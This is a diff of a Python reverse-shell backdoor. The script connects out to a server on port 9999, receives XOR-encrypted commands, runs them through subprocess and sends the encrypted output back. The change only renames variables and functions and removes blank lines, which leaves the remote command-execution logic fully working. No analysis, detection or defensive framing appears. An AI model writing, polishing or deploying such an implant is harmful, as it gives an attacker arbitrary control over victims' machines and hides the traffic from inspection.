@@ -10,38 +10,32 @@ port = 9999
 ENCRYPTION_KEY = b'secretkey'
 
 
-def xor_crypt(data, key):
+def xor_encode(data, key):
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
 
 
 def connect_to_server():
     try:
-        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-        client.connect((server_ip, port))  
-
+        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connection.connect((server_ip, port))  
         while True:
-            encrypted_command = client.recv(4096)
-            if not encrypted_command:
+            command_data = connection.recv(4096)
+            if not command_data:
                 break
-            command = xor_crypt(encrypted_command, ENCRYPTION_KEY).decode()
-
+            command = xor_encode(command_data, ENCRYPTION_KEY).decode()
             if command.lower() == 'exit':
-                client.close()
+                connection.close()
                 break
-
             try:
                 output = subprocess.getoutput(command)
                 if not output:
                     output = "Command executed successfully"
-            except Exception as e:
-                output = str(e)
-
-            encrypted_output = xor_crypt(output.encode(), ENCRYPTION_KEY)
-            client.sendall(encrypted_output)
-
-    except Exception as e:
-        print(f"Connection error: {e}")
+            except Exception as error:
+                output = str(error)
+            output_data = xor_encode(output.encode(), ENCRYPTION_KEY)
+            connection.sendall(output_data)
+    except Exception as error:
+        print(f"Connection error: {error}")
 
 
 
